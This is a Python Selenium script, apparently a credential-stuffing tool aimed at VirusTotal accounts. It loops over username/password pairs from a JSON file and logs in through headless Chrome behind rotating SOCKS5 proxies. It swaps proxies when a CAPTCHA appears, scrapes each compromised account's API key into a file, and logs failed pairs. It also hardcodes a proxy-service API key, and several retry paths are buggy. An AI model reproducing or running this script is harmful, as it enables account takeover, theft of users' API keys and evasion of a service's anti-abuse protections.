import json
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import re
import traceback
import requests

API_KEY = 'ff0efe491eca95f43cc79bb5a381b153'

# Open the JSON file and read its content
with open('data.json', 'r') as file:
    data = json.load(file)

chrome_driver_path = "chromedriver-linux64/chromedriver"  # Replace with the actual path to ChromeDriver

def get_current_proxy():
    api = 'https://tmproxy.com/api/proxy/get-current-proxy'
    res = requests.post(api, headers={'Accept': 'application/json', 'Content-Type': 'application/json'}, json={'api_key':f'{API_KEY}'})
    proxy_data = res.json()
    if proxy_data['data']['socks5'] == '':
        proxy = rotate_proxy()
        print(f"Proxy đang sử dụng: {proxy}")
        return proxy
    else:
        print(f"Proxy đang sử dụng: {proxy_data['data']['socks5']}")
        return proxy_data['data']['socks5']

def rotate_proxy():
    api = "https://tmproxy.com/api/proxy/get-new-proxy"
    res = requests.post(api,headers={'Accept': 'application/json', 'Content-Type': 'application/json'}, json={'api_key':f'{API_KEY}'})
    proxy_data = res.json()
    pattern = r"retry after (\d+) second\(s\)"
    if proxy_data['code'] != 0:
        time.sleep(re.search(pattern, proxy_data['message']).group(1))
        rotate_proxy()
    print(f"Đã đổi proxy: {proxy_data['data']['socks5']}")
    return proxy_data['data']['socks5']

# Function to configure Chrome with a specific proxy
# def configure_proxy(chrome_options, proxy):
#     # proxy = "27.73.108.156:18439"  # The specific proxy you want to use
#     chrome_options.add_argument(f'--proxy-server=socks5://{proxy}')
#     print(f"Using proxy: socks5://{proxy}")

# Initialize WebDriver
def init_driver(proxy):
    chrome_options = Options()
    chrome_options.binary_location = "chrome-linux64/chrome"
    chrome_options.add_argument("--headless")
    chrome_options.add_argument(f'--proxy-server=socks5://{proxy}')
    
    service = Service(chrome_driver_path)
    driver = webdriver.Chrome(service=service, options=chrome_options)
    driver.delete_all_cookies()
    return driver

def login(driver, username, password):
    try:
        # Open VirusTotal login page
        driver.get("https://www.virustotal.com/gui/sign-in")
        time.sleep(3)
        if "captcha" in driver.current_url:
            print("!!!!!!!!!!! CAPTCHA detected")
            new_proxy = rotate_proxy()
            init_driver(new_proxy)

        
        # Save a screenshot for debugging
        png = driver.get_screenshot_as_png()
        with open("screenshot.png", "wb") as file:
            file.write(png)
        
        # Wait for the email input field to be present
        email_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "userId"))
        )
        
        # Enter the username
        email_input.send_keys(username)

        # Wait for the password input field to be present
        password_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "password"))
        )
        
        # Enter the password
        password_input.send_keys(password)

        # Submit the login form
        password_input.send_keys(Keys.RETURN)

        # Wait for the page to load and the URL to change
        time.sleep(5)
        
        # Check if login was successful by checking the URL
        if "home" in driver.current_url:
            print(f"Login successful for {username}")
            result = f"Login successful for {username}:{password}\n"
            print(result)
            
            # Navigate to the API key page
            driver.get("https://www.virustotal.com/gui/my-apikey")
            time.sleep(5)

            key_element = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, 'view-container'))
            )

            # Extract the text content from the element
            key_value = key_element.text
            pattern = r'[a-fA-F0-9]{64}'

            # Search for the pattern in the text
            match = re.search(pattern, key_value)

            if match:
                print(f"Found a key: {match.group(0)}")
                with open('key.txt','a') as file:
                    file.write('\n')
                    file.write(match.group(0))
            else:
                print("Key not found.")
        elif "captcha" in driver.current_url:
            print("!!!!!!!!!!! CAPTCHA detected")
            new_proxy = rotate_proxy()
            init_driver(new_proxy)
        else:
            print(f"Login failed for {username}")
            with open('fail.txt','a') as file:
                file.write(username+" "+password)
                file.write("\n")
    except Exception as e:
        print(f"An error occurred: {e}")
        traceback.print_exc()

if __name__ == "__main__": # Fetch the proxy list
    for d in data:
        username = d['username']
        password = d['password']
        proxy = get_current_proxy()
        driver = init_driver(proxy)  # Initialize WebDriver with proxy
        login(driver, username, password)
        driver.quit()
    # print(get_current_proxy())
